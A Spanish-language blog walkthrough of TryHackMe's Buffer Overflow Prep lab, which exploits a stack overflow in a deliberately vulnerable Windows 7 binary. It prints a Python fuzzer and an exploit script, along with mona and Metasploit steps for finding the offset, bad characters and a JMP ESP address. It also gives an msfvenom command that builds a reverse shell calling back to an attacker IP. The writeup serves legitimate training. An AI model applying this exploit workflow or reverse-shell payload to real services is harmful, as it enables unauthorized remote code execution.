---
layout: single
title: Room Buffer Overflow Prep - TryHackMe (Offensive Pentesting Path)
excerpt: "Esta etapa del path consiste en aprender y practicar el buffer overflow de sistemas Windows. La primera room consta de un binario especialmente creado para practicar el buffer overflow de cara a la certificación OSCP por medio de 10 ejercicios. En este manual solo lo realizaremos para uno de ellos."
date: 2022-07-12
classes: wide
header:
  teaser: /assets/images/bof/portada.png
  teaser_home_page: true
categories:
  - Comunidad
  - Blog
  - Writeup
tags:
  - fuzzing
  - bof
  - overflow
  - immunity debugger
  - mona
  - windows
  - badchars
  - scripting
---

# Introducción
La room se encuentra en [TryHackMe](https://tryhackme.com/room/bufferoverflowprep). Se trata de una máquina Windows 7 de 32 bits diseñada para practicar los stack based buffer overflows por medio de un binario denominado **oscp.exe**. Este binario contiene dentro 10 ejercicios que se desarrollan de manera similar entre ellos, razón por la cual solo resolveremos uno en esta guía esperando que las instrucciones sean lo suficientemente detalladas como para replicarlos en los 9 ejercicios restantes.

Para una introducción y algo de teoría sobre lo que es un buffer overflow, te recomiendo mi guía que hice hace un tiempo: [Introducción al Buffer Overflow](https://blu3ming.github.io/bof-introduccion-protostar-stack0-1), será necesaria para entender algunas técnicas que realizaremos a continuación.

# Conexión con Escritorio Remoto
Todo este procedimiento se puede realizar desde una máquina Windows, aunque recomiento tener instalado el subsistema Kali para algunos comandos que necesitaremos; esta es la forma en la que resolví el room. Dado que se nos proporciona una máquina con Windows 7 desde la cual emplearemos el **Immunity Debugger**, lo primero que necesitamos será conectarnos a la VPN de TryHackMe; para esto, yo uso *OpenVPN Connect* en Windows 10.

Una vez conectados, abrimos la herramienta de **Conexión a Escritorio Remoto**, introducimos la IP y desplegamos el menú de opciones avanzadas. Aquí, solo será necesario introducir al usuario que la plataforma nos proporciona: **admin**. Daremos clic en *Conectar*.

![1]

Nos pedirá la contraseña de acceso al sistema, esta es **password**. Por último, nos saldrá una alerta de verificación de identidad, la cual podemos omitir y aceptar conectarse de todos modos haciendo clic en *Sí*.

![2]

De esta manera, tendremos acceso a la máquina remota.

![3]

Dentro del Escritorio, veremos el Immunity Debugger, lo ejecutamos como Administrador y veremos la interfaz del programa. Seleccionamos Archivo -> Abrir y buscamos dentro del *Escritorio* la carpeta "vulnerable-apps", dentro de esta la carpeta "oscp" y dentro el binario que nos compete: **oscp.exe**.

![4]

El programa comenzará a inicializarse, pero debemos reanudar su ejecución dando clic en el botón rojo de *play* una vez:

![5]

En el apartado de comandos de Immunity Debugger (parte inferior) deberemos primero setear el direcctorio de trabajo para el plugin **mona** que vamos a estar empleando:

    !mona config -set workingfolder c:\mona\%p

Debemos crear los siguientes scripts en nuestro sistema de atacante (en mi caso hago uso de Visual Studio Code y su shell integrada, la cual despliega mi subsistema Kali):

fuzzer.py
    
    #!/usr/bin/env python3

    import socket, time, sys

    ip = "IP"

    port = 1337
    timeout = 5
    prefix = "OVERFLOW2 "

    string = prefix + "A" * 100

    while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
        s.send(bytes(string, "latin-1"))
        s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)

exploit.py

    import socket

    ip = "IP"
    port = 1337

    prefix = "OVERFLOW2 "
    offset = 0
    overflow = "A" * offset
    retn = ""
    padding = ""
    payload = ""
    postfix = ""

    buffer = prefix + overflow + retn + padding + payload + postfix

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
    except:
    print("Could not connect.")

No me detendré a explicar cómo funciona cada uno de ellos, se entiende que posees un entendimiento básico de Python. Solo debes modificar la variable ip por la IP de la máquina donde esté corriendo el Windows 7. No solo eso, como ya se explicó, el room contiene 10 ejercicios, y para cambiar entre ellos será necesario modificar la variable *prefix* por el número de ejercicio del que se trate: como vamos a resolver el ejercicio 2, ponemos **OVERFLOW2**.

Resolveremos el ejercicio dos dado que casi todos los Writeups que hay por ahí resuelven el uno, y como ese lo resolví sin tomar evidencias, por eso mejor iniciamos con este.

# 1. Fuzzear el programa
Lo primero que debemos hacer es realizar un fuzzing en el programa víctima. Se envía una serie de cadenas de diferente tamaño (en tantos de 100) hasta que este crashee; lo cual nos indica que el programa sufrió un desbordamiento del buffer. Recordemos que hacemos esto para saber en qué momento exacto sobreescribimos el EIP.

Ejecutamos el fuzzer:

    python3 fuzzer.py

![6]

Comprobamos que esté funcionando en la máquina víctima, donde deberemos estar recibiendo los datos.

![7]

Va a llegar un punto en el que el script ya no pueda enviar más información, momento en el que el programa ha crasheado y entonces podemos tener un aproximado de cuántos caracteres se requieren para el desbordamiento.

En este caso, parece haber crasheado cerca de los 700 bytes.

![8]

Esto lo podemos observar en el Immunity Debugger (recordemos que para el desbordamiento estamos enviando solo caracteres "A")

![9]

# 2. Creando un patrón de caracteres en busca del offset
Nuestro siguiente paso es buscar el punto exacto en el que el desbordamiento comienza a sobreescribir el EIP (recordemos que requerimos poder escribir sobre él para controlar el flujo del programa). Para ello, creamos un patrón de caracteres con ayuda de Metasploit.

    /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1100

De esta forma le indicamos a la herramienta que nos devuelva un patrón de caracteres de tamaño 1100 bytes. Se recomienda que sean 400 bytes más que el número que nos devolvió el fuzzing del paso anterior (700 + 400 = 1100).

![10]

Este patrón de caracteres debemos colocarlo en la variable *payload* del script **exploit.py** (solo trabajaremos con este script a partir de ahora). Ahora debemos enviarlo nuevamente al programa víctima, pero para ello será necesario reiniciar el Immunity Debugger, volver a abrir el binario e iniciarlo con el botón de *play* (este procedimiento se repite cada que crasheemos el programa). Tenemos la ventaja de que en ocasiones subsecuentes, ya tenemos el binario en el apartado de recientes.

![11]

Colocamos el patrón de caracteres en el script **exploit.py** y lo ejecutamos; veremos cómo este nos indica que ha enviado correctamente el buffer.

![12]

Esto logrará crashear el binario. Ahora debemos buscar el offset específico para saber a partir de dónde comienza a sobreescribir el EIP. Para ello, ejecutamos el siguiente comando en el Immunity Debugger:

    !mona findmsp -distance 1100

Donde la distancia que le pasamos es el tamaño del patrón de caracteres creado anteriormente.

![13]

Esto nos creará un archivo en el directorio detrabajo que especificamos al inicio, el cual se encuentra en el directorio:

    c:\mona\oscp

Esta carpeta contendrá un archivo llamado *findmsp.txt* con información sobre el estado de la memoria en el espacio indicado por la distancia. Lo importante de este archivo es ubicar el apartado del EIP, este nos indicará el offset al final de la línea: en nuestro caso, tenemos un offset de 634.

Esto quiere decir que tenemos que llenar con 634 bytes antes de lograr sobreescribir el EIP.

![14]

# 3. Sobreescritura del EIP (prueba)
Para corroborarlo, ponemos el offset en la variable homónima del script y colocamos "BBBB" en la variable *retn*. Esta variable nos ayudará a especificar la dirección de retorno, que almacena el registro EIP en el sistema. Por lo tanto, esta prueba nos ayudará a determinar si somos capaces de sobreescribir el EIP, ya que al término de la ejecución lo tendremos en uN estado 42424242 (es decir, 4 B's).

![15]

Ejecutamos el script con estas modificaciones y observamos el estado de los registros al momento de crashear el binario. Como podemos observar, hemos logrado llenar el EIP de solo B's (42424242).

![16]

# 4. Búsqueda de los badchars
Con esto listo, solo nos queda crear el payload adeuado para poder ganar acceso al sistema, sin embargo, esto requiere de un par de pasos adicionales. Primero, debemos ubicar cuáles son aquellos caracteres que el binario no logra interpretar correctamente y que serían un problema si los incluimos al payload que queremos ejecutar. Para ello, primero debemos buscar estos "badchars" y eliminarlos de todo nuestro procedimiento siguiente.

Para ello, primero creamos bytearray origen donde tendremos todos los caracteres desde el "\x01" hasta el "\xff". El "\x00" no se contempla por defecto, ya que caso siempre se trata de un *"badchar"*.

Para ello ejecutamos en Immunity Debugger:

    !mona bytearray -b "\x00"

Donde creamos el bytearray sin el caso particular ya explicado. Veremos cómo en la ventana log se nos muestra que ha creado el archivo *.bin* correctamente.

![17]

Ahora, lo incluimos también en nuestra variable **payload** del script:

    \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff

![18]

El objetivo de este paso será que, una vez enviado el payload al binario, este descartará aquellos caracteres que no pueda interpretar correctamente, de tal forma que no todos terminarán escritos en la memoria. Entonces, haremos un comparativo entre el bytearray original (creado con el *.bin*) y lo que se muestra en memoria. Aquellos caracteres que no aparezcan, posiblemente se traten de *badchars*.

Ejecutamos el script, en el Immunity Debugger tomamos nota de la dirección a la que apunta el registro ESP y ejecutamos el siguiente comando:

    !mona compare -f c:\mona\oscp\bytearray.bin -a 01A0FA30

![19]

![20]

Al ejecutarlo, nos aparecerá otra ventana donde podremos ver cuáles fueron los caracteres que no se encontraron en memoria y deberían estar ahí: nuestros *baschars*. Sin embargo, ocurre algo peculiar: Es bastante común que se contemple como un *badchar* al caracter subsecuente de otro, cuando solo se trata de un falso positivo.

Es decir, si la salida nos indica que los caracteres "\x11" y "\x12" son badchars, es muy probable que el solo el primero ("\x11") lo sea, mientras que el segundo ("\x12") solo sea un falso positivo al ser consecutivo del primero.

En nuestro caso particular, tenemos los siguientes "*badchars*":

    \x00\x23\x24\x3c\x3d\x83\x84\xba\xbb

Siendo muy probable que solo los siguientes sean los verdaderos:

    \x00\x23\x3c\x83\xba

Para corroborarlo, repetimos los pasos de todo este apartado, desde la creación del bytearray con mona (anexando ahora los nuevos badchars):

    !mona bytearray -b "\x00\x23\x3c\x83\xba"

Borramos también dichos caracteres de la cadena *payload* enviada en el script y lo volvemos a ejecutar. Si nuevamente realizamos el comparativo con mona, podremos ver lo siguiente:

![21]

Cuando la salida nos indique **Unmodified**, quiere decir que ya no encontró más badchars aparte de los ya detectados. Esto nos indica a su vez que aquellos caracteres que descartamos como falsos positivos realmente lo eran; de lo contrario, hubieran vuelto a aparacer aquí y tendríamos que repetir todo el proceso nuevamente hasta que obtengamos el *Unmodified*.

Esto sucede en el caso del ejercicio 9 **OVERFLOW9**, donde tras una segunda comparativa nos encontraremos con que los badchars siguen apareciendo (aunque ya los hayamos eliminado), otros ya no, e incluso podríamos ver nuevos *badchars*. Es importante ver si estos últimos son consecutivos de alguno que se haya considerado en su momento falso positivo:

	Primera pasada (comparativa): \x00\x04\x05\x3e\x3f\xe1\xe2
	Eliminando los posibles falsos positivos: \x00\x04\x3e\xe1
	Segunda pasada (comparativa): \x00\x04\x3e\x3f\x40\xe1
	
Como podemos observar, continua apareciando el \x3f que habíamos considerado como falso positivo (los demás ya no aparecen). Nótese cómo el nuevo caracter \x40 es consecutivo de este; por lo tanto, existe una alta probabilidad de que el \x40 sea un nuevo falso positivo, volviendo al \x3f un badchar más que no se tenía contemplado:

	Eliminando los posibles falsos positivos (segunda vez): \x00\x04\x3e\x3f\xe1
	Tercera pasada (comparativa): Unmodified
	
Esto se tiene que repetir en caso de que aún aparecieran más; pero al menos en este caso, al obtener el **Unmodified**, podemos asegurar haberlos encontrado a todos.

# 5. Búsqueda del JMP ESP
Recordemos que no basta con colocar la dirección del ESP en el EIP para poder realizar el salto y ejecutar nuestro payload (el cual se almacena en ESP). El sistema simplemente no puede realizar tal ejecución. Para resolverlo, requerimos de la instrucción en ensamblador JMP, la cual realiza un salto a una dirección de memoria que le proporcionemos; en nuestro caso, necesitamos que haga ese salto al ESP: JMP ESP.

Para buscar una instrucción similar en todo el código del binario, podemos usar el siguiente comando de mona:

    !mona jmp -r esp -cpb "\x00\x23\x3c\x83\xba"

Con esto, le indicamos a mona que busque en todo el binario alguna instrucción **JMP ESP** que no contenga los badchars que ya hemos detectado. Al ejecutarla, obtenemos la siguiente salida:

![22]

Se trata de un listado de direcciones que realizan esa instrucción en el binario o bibliotecas *dll* de este. Debemos verificar que esta instrucción, además, cuente con el ASLR y el SafeSEH deshabilitados (False); todos lo tienen, pero más vale asegurarse.

Podemos seleccionar el que nosotros queramos, pero recomiendo empezar por el primero. Necesitamos la dirección, para ello, hacemos clic derecho -> Copy to clipboard -> Address.

![23]

La pegamos en la variable retn de nuestro script. Dado que el sistema Windows 7 tiene notación Little Endian, deberemos escribir la dirección de manera inversa:

    Dirección de Immunity Debugger: 625011AF
    Dirección ya transformada: \xaf\x11\x50\x62

![24]

# 6. Creación del payload malicioso
Nuestra siguiente tarea será crear el payload que efectuará la acción que deseemos en el sistema víctima. Se suele emplear una reverse shell, pero sépase que podemos hacer cualquier acción que queramos.

Para ello, empleamos *msfvenom* para su creación:

    msfvenom -p windows/shell_reverse_tcp LHOST=10.13.14.131 LPORT=443 EXITFUNC=thread -b "\x00\x23\x3c\x83\xba" -f c

Con esto, le indicamos lo siguiente:
- -p windows/shell_reverse_tcp: Que queremos una reverse shell de Windows.
- LHOST LPORT: Que se conecte a la IP y puerto especificados.
- EXITFUNC=thread: Que efectue todo desde un proceso hijo, de tal manera que cuando crasheemos la aplicación, no sea el proceso padre el que muera (podríamos ocasionar un BSOD en el sistema).
- -b: Le indicamos los badchars que no debe emplear en su creación.
- -f c: Que la salida la requerimos en formato código C.
  
![25]

Este payload generado lo colocamos en la variable *payload* encerrándolo entre paréntesis (dado que contamos con más de una línea).

![26]

# 7. Añadiendo los NOP's
Es buena práctica añadir espacios de tiempo entre que el programa realiza el salto al ESP y empieza a ejecutar el payload que le hemos enviado. Este tiempo lo necesita el sistema para decodificar la muestra recibida, de otro modo, corremos el riesgo de que el payload sea ejecutado desde un par de caracteres posteriores y este quede corrupto.

Estos espacios de tiempo se conocen como NOP (No Operation) y básicamente le dicen al sistema que edscanse un par de milisegundos antes de ir a la siguiente instrucción (a grandes rasgos).

Es buena práctica emplear al menos 16 NOP's antes de ejecutar el payload, y estos se añaden en la variable *padding* de nuestro script (su caracter es "\x90").

![27]

# 8. Ejecutando el exploit y obteniendo acceso
Por último, solo nos resta reiniciar el binario en el sistema Windows (ya sea solo el binario o con Immunity Debugger) y ejecutar el script *exploit.py*. Haciendo esto, debemos de ya tener una terminal en escucha con netcat para recibir la reverse shell.

Como podemos observar, una vez ejecutado el payload, obtenemos una shell en el sistema, y lo mejor es que la obtenemos como el usuario administrador; esto no siempre será así, pero la mayor parte de veces se logra.

![28]

[1]:/assets/images/bof/1.png
[2]:/assets/images/bof/2.png
[3]:/assets/images/bof/3.png
[4]:/assets/images/bof/4.png
[5]:/assets/images/bof/5.png
[6]:/assets/images/bof/6.png
[7]:/assets/images/bof/7.png
[8]:/assets/images/bof/8.png
[9]:/assets/images/bof/9.png
[10]:/assets/images/bof/10.png
[11]:/assets/images/bof/11.png
[12]:/assets/images/bof/12.png
[13]:/assets/images/bof/13.png
[14]:/assets/images/bof/14.png
[15]:/assets/images/bof/15.png
[16]:/assets/images/bof/16.png
[17]:/assets/images/bof/17.png
[18]:/assets/images/bof/18.png
[19]:/assets/images/bof/19.png
[20]:/assets/images/bof/20.png
[21]:/assets/images/bof/21.png
[22]:/assets/images/bof/22.png
[23]:/assets/images/bof/23.png
[24]:/assets/images/bof/24.png
[25]:/assets/images/bof/25.png
[26]:/assets/images/bof/26.png
[27]:/assets/images/bof/27.png
[28]:/assets/images/bof/28.png